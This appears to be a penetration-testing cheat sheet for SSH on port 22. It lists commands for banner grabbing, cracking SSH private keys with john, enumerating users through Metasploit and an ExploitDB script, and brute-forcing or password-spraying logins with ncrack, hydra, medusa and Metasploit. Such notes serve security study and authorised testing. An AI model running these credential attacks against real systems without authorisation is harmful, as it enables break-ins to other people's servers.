# SSH (22)

--- 

### 1) SSH Enumeration

- check banner and check version -- is there any login info. on there? Is it exploitable?
	- `nc -v <target> 22`
- do you have a username and password or SSH identify file (key)?
- if you have an encrypted .ssh id_rsa file/key -- crack it with john to get password to use:
    - `ssh2john id_rsa > id_rsa.hash` -> `john --wordlist=<wordlist> id_rsa.hash`
- enumerate users:
	```bash
	 # using msf
	 msf > use auxiliary/scanner/ssh/ssh_enumusers
	 # leveraging exploit from ExploitDB
	 python /usr/share/exploitdb/platforms/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $IP
	 ```
 




<br>

### 2) SSH Exploitation

Brute force login:
- with **ncrack**:
	- `ncrack -U <username_list> -P <password_list> <target_ip> -p <service>`
	- i.e. `ncrack -U usernames.txt -P passwords.txt 192.168.44.42 -p ssh`
- with **hydra**:
	- usage `hydra -L <username_list> -P <password_list> <service>://<target_ip> -T <threads>`
	- use `-l` or `-p` to specify a single username/password 
	- i.e. `hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1` 
- with **medusa**:
	- `medusa -h <target_ip> -M <service> -U <username_list> -P <password_list>`
	- i.e. `medusa -h 192.168.12.2 -M ssh -U usernames.txt -P passwords.txt`
- with **metasploit**:
	- `use auxiliary/scanner/ssh/ssh_login` 
    - can use `/usr/share/ncrack/minimal.usr` file as wordlist

Password spray attack with hydra:
- `hyrda -l <found_user> -p <found_password> -M <list_of_ssh_servers>.txt ssh`